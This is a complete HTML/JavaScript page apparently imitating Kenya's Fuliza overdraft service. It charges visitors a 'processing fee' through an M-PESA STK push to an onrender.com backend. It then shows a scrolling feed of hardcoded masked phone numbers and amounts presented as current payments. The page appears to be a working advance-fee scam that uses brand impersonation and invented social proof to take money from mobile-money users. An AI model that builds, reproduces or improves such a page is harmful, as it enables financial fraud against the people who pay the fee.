
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Processing Fee Payment</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    min-height: 100vh;
    background: #E8F7EF;
    font-family: 'Mali', cursive;
    color: #006B3F;
}

.container {
    width: 92%;
    max-width: 480px;
    margin: auto;
}

header {
    background: #00A651;
    color: white;
    padding: 22px 0;
    text-align: center;
}

.logo {
    font-size: 25px;
    font-weight: 700;
}

.card {
    background: white;
    margin-top: 24px;
    padding: 22px 18px 18px;
    border-radius: 14px;
    box-shadow: 0 3px 12px rgba(0,107,63,.08);
    border: 1px solid #B7E5CC;
}

h1 {
    color: white;
    background: #00A651;
    padding: 12px 8px;
    border-radius: 10px;
    font-size: 22px;
    text-align: center;
    margin-bottom: 16px;
}

.subtitle {
    background: #E8F7EF;
    color: black;
    padding: 14px 12px;
    border-radius: 12px;
    font-family: Arial, sans-serif;
    font-size: 14px;
    text-align: center;
    margin-bottom: 15px;
    border: 1px solid #B7E5CC;
}

.summary {
    background: white;
    border-radius: 13px;
    padding: 15px;
    margin-bottom: 15px;
    border: 1px solid #B7E5CC;
}

.row {
    display: flex;
    justify-content: space-between;
    padding: 9px 0;
    font-size: 14px;
}

.row + .row {
    border-top: 1px solid #B7E5CC;
}

.label, .value {
    color: black;
}

.value {
    font-weight: 700;
}

label {
    display: block;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 7px;
}

input {
    width: 100%;
    padding: 14px;
    border: 1px solid #B7E5CC;
    border-radius: 10px;
    font-family: Arial, sans-serif;
    font-size: 15px;
    margin-bottom: 17px;
    background: white;
    color: black;
}

input:focus {
    outline: none;
    border-color: #00A651;
}

.btn {
    width: 100%;
    padding: 15px;
    border: 0;
    border-radius: 12px;
    background: #00A651;
    color: white;
    font-family: 'Mali', cursive;
    font-size: 20px;
    font-weight: 600;
    cursor: pointer;
}

.btn:disabled {
    opacity: .6;
    cursor: not-allowed;
}

.message {
    min-height: 22px;
    margin-top: 12px;
    color: #006B3F;
    font-family: Arial, sans-serif;
    font-size: 13px;
    line-height: 1.5;
    text-align: center;
}

/* CURRENT ACTIVITY */

.activity-section {
    margin-top: 22px;
    padding-top: 17px;
    border-top: 1px solid #B7E5CC;
}

.activity-title {
    font-family: Arial, sans-serif;
    font-size: 15px;
    font-weight: 700;
    color: #006B3F;
    margin-bottom: 12px;
}

.activity-window {
    height: 210px;
    overflow: hidden;
    position: relative;
}

.activity-list {
    display: flex;
    flex-direction: column;
    animation: activityScroll 25s linear infinite;
}

.activity-window:hover .activity-list {
    animation-play-state: paused;
}

.activity-item {
    min-height: 46px;
    padding: 12px 7px;
    border-bottom: 1px solid #E8F7EF;
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 6px;
    font-family: Arial, sans-serif;
    font-size: 12px;
}

.activity-item span {
    color: #333;
}

.activity-item strong {
    color: #00A651;
    font-size: 13px;
    white-space: nowrap;
}

@keyframes activityScroll {
    from {
        transform: translateY(0);
    }
    to {
        transform: translateY(-50%);
    }
}

.notice {
    margin-top: 15px;
    padding: 12px;
    background: #E8F7EF;
    border: 1px solid #B7E5CC;
    border-radius: 9px;
    color: black;
    font-family: Arial, sans-serif;
    font-size: 12px;
    line-height: 1.5;
}

footer {
    text-align: center;
    padding: 15px 10px;
    color: #006B3F;
    font-family: Arial, sans-serif;
    font-size: 12px;
    line-height: 1.7;
}

footer a {
    color: #006B3F;
    text-decoration: none;
}

@media(max-width:360px) {
    .card {
        padding: 18px 13px;
    }

    h1 {
        font-size: 20px;
    }

    .btn {
        font-size: 18px;
    }
}

@media(prefers-reduced-motion: reduce) {
    .activity-list {
        animation: none;
    }
}
</style>
</head>

<body>

<header>
    <div class="container">
        <div class="logo">FULIZA</div>
    </div>
</header>

<main class="container">
<section class="card">

<h1>Processing Fee Payment</h1>

<p class="subtitle">
Complete the payment using your M-PESA phone number.
</p>

<div class="summary">
    <div class="row">
        <span class="label">Selected processing fee</span>
        <span class="value" id="selectedService">—</span>
    </div>

    <div class="row">
        <span class="label">Processing Fee</span>
        <span class="value" id="serviceFee">—</span>
    </div>
</div>

<form id="paymentForm">

    <label for="phone">M-PESA Phone Number</label>

    <input
        type="tel"
        id="phone"
        placeholder="07XXXXXXXX"
        inputmode="numeric"
        autocomplete="tel"
        maxlength="10"
        required
    >

    <button type="submit" class="btn" id="paymentBtn">
        Pay Processing Fee
    </button>

</form>

<!-- CURRENT ACTIVITY -->

<div class="activity-section">

    <div class="activity-title">
        CURRENT ACTIVITY
    </div>

    <div class="activity-window">
        <div class="activity-list" id="activityList"></div>
    </div>

    <div class="message" id="activityNotice">
        Illustrative activity display, not live payment records.
    </div>

</div>

<div class="message" id="paymentMessage"></div>

<div class="notice"></div>

</section>
</main>

<footer>
    <a href="#">Terms &amp; Conditions</a> |
    <a href="#">Privacy Policy</a> |
    <a href="#">Support</a>
    <br>
    © 2026 Fulboost. All rights reserved.
</footer>

<script>

// ====================================
// PAYMENT DETAILS
// ====================================

const selectedServiceElement =
    document.getElementById("selectedService");

const serviceFeeElement =
    document.getElementById("serviceFee");

const paymentForm =
    document.getElementById("paymentForm");

const paymentBtn =
    document.getElementById("paymentBtn");

const phoneInput =
    document.getElementById("phone");

const paymentMessage =
    document.getElementById("paymentMessage");

const selectedLimit =
    sessionStorage.getItem("selectedLimit");

const serviceFee =
    sessionStorage.getItem("serviceFee");

if (!selectedLimit || !serviceFee) {

    selectedServiceElement.textContent = "Not selected";
    serviceFeeElement.textContent = "Not available";

    paymentBtn.disabled = true;

    paymentMessage.textContent =
        "No service selection was found.";

    setTimeout(() => {
        window.location.href = "amount.html";
    }, 1500);

} else {

    selectedServiceElement.textContent =
        "KSh " + Number(selectedLimit).toLocaleString();

    serviceFeeElement.textContent =
        "KSh " + Number(serviceFee).toLocaleString();
}


// ====================================
// CURRENT ACTIVITY
// ====================================

// Illustrative entries only.
// Replace with verified backend records
// before displaying them as actual payments.

const activityEntries = [
    ["0702***456", "8,000"],
    ["0714***555", "15,000"],
    ["0791***234", "25,000"],
    ["0722***891", "35,000"],
    ["0705***678", "55,000"],
    ["0743***210", "65,000"],
    ["0112***345", "75,000"],
    ["0798***654", "85,000"],
    ["0718***321", "8,000"],
    ["0706***432", "15,000"],
    ["0725***678", "25,000"],
    ["0794***123", "35,000"]
];

const activityList =
    document.getElementById("activityList");

function renderActivity() {

    const repeatedEntries = [
        ...activityEntries,
        ...activityEntries
    ];

    activityList.innerHTML =
        repeatedEntries.map(item => `
            <div class="activity-item">
                <span>${item[0]}</span>
                <strong>KSh ${item[1]}</strong>
            </div>
        `).join("");
}

renderActivity();


// ====================================
// PHONE NORMALIZATION
// ====================================

function normalizePhone(phone) {

    phone = String(phone).replace(/\s+/g, "");

    if (phone.startsWith("0")) {
        phone = "254" + phone.substring(1);
    }

    if (phone.startsWith("+254")) {
        phone = phone.substring(1);
    }

    return phone;
}


// ====================================
// SUBMIT PAYMENT
// ====================================

paymentForm.addEventListener("submit", async function(event) {

    event.preventDefault();

    const enteredPhone = phoneInput.value.trim();

    const phonePattern = /^(07|01)\d{8}$/;

    if (!phonePattern.test(enteredPhone)) {

        alert("Please enter a valid Kenyan phone number.");
        phoneInput.focus();
        return;
    }

    const phone = normalizePhone(enteredPhone);

    localStorage.setItem("paymentPhone", enteredPhone);

    paymentBtn.textContent = "Sending STK Push...";
    paymentBtn.disabled = true;

    paymentMessage.textContent =
        "Please wait while we send the M-PESA payment request.";

    try {

        const response = await fetch(
            "https://fuliza-backend-1.onrender.com/stk-push",
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    phone: phone,
                    amount: Number(serviceFee)
                })
            }
        );

        const data = await response.json();

        if (!response.ok || !data.success) {
            throw new Error(data.message || "STK Push failed.");
        }

        const transactionId =
            data.transactionId ||
            data.checkout_request_id;

        if (!transactionId) {
            throw new Error("No Paylor transaction ID received.");
        }

        paymentBtn.textContent = "Processing...";

        paymentMessage.textContent =
            "An M-PESA payment request has been sent to your phone. Enter your M-PESA PIN to complete the payment.";

        checkPayment(transactionId);

    } catch (error) {

        console.log("PAYMENT ERROR:", error);

        paymentMessage.textContent =
            error.message || "Payment request failed.";

        paymentBtn.textContent = "Pay Processing Fee";
        paymentBtn.disabled = false;
    }

});


// ====================================
// CHECK PAYMENT STATUS
// ====================================

async function checkPayment(transactionId) {

    let attempts = 0;
    const maxAttempts = 40;

    const interval = setInterval(async () => {

        attempts++;

        if (attempts > maxAttempts) {

            clearInterval(interval);

            paymentMessage.textContent =
                "Payment confirmation is taking longer than expected. Please check your M-PESA messages before trying again.";

            paymentBtn.textContent = "Pay Processing Fee";
            paymentBtn.disabled = false;

            return;
        }

        try {

            const response = await fetch(
                "https://fuliza-backend-1.onrender.com/payment-status",
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        transactionId: transactionId
                    })
                }
            );

            const result = await response.json();

            if (!result.success) return;

            const status = String(
                result.status ||
                result.data?.status ||
                ""
            ).toUpperCase();

            if (status === "COMPLETED") {

                clearInterval(interval);

                paymentMessage.textContent =
                    "Payment successful. Redirecting...";

                window.location.href = "delivery.html";

            } else if (
                status === "FAILED" ||
                status === "CANCELLED"
            ) {

                clearInterval(interval);

                paymentMessage.textContent =
                    "Payment " + status.toLowerCase() + ".";

                paymentBtn.textContent = "Pay Processing Fee";
                paymentBtn.disabled = false;
            }

        } catch (error) {

            console.log("STATUS ERROR:", error);
        }

    }, 3000);
}

</script>

</body>
</html>
